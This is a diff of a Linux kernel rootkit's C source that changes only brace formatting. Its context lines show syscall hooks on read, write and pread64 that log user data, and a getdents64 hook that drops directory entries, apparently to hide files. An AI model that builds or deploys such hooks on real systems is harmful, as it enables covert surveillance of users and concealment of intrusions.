@@ -82,12 +82,14 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
 
     IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
-    } else {
+    }
+    else {
         l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
         IF_U (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
-        } else {
+        }
+        else {
             s_data[l_ret] = '\0';
             pr_info("[ROOTKIT] * Data read: %s\n", s_data);
         }
@@ -123,12 +125,14 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 
     IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
-    } else {
+    }
+    else {
         l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
         IF_U (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
-        } else {
+        }
+        else {
             s_data[l_ret] = '\0';
             pr_info("[ROOTKIT] * Data to write: %s\n", s_data);
         }
@@ -188,12 +192,14 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
 
     IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
-    } else {
+    }
+    else {
         l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
         IF_U (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
-        } else {
+        }
+        else {
             s_data[l_ret] = '\0';
             pr_info("[ROOTKIT] * Data read: %s\n", s_data);
         }
@@ -272,7 +278,8 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         // No entries or error, return immediately
         IF_L (l_ret_orig == 0) {
             pr_info("[ROOTKIT] * No entries\n");
-        } else {
+        }
+        else {
             pr_err("[ROOTKIT] * Error: %ld\n", l_ret_orig);
         }
         return l_ret_orig;
@@ -317,7 +324,8 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
             // Decrease the total length
             l_ret -= us_reclen;
-        } else {
+        }
+        else {
             // Update the iterator to the next directory entry
             p_dirent_k_it = (dirent64_t *)((char *)p_dirent_k_it + us_reclen);
         }
@@ -332,7 +340,8 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         IF_U (l_err != 0) {
             pr_err("[ROOTKIT] * Could not clear user buffer\n");
         }
-    } else {
+    }
+    else {
         pr_err("[ROOTKIT] * Could not copy data back to user\n");
     }
 
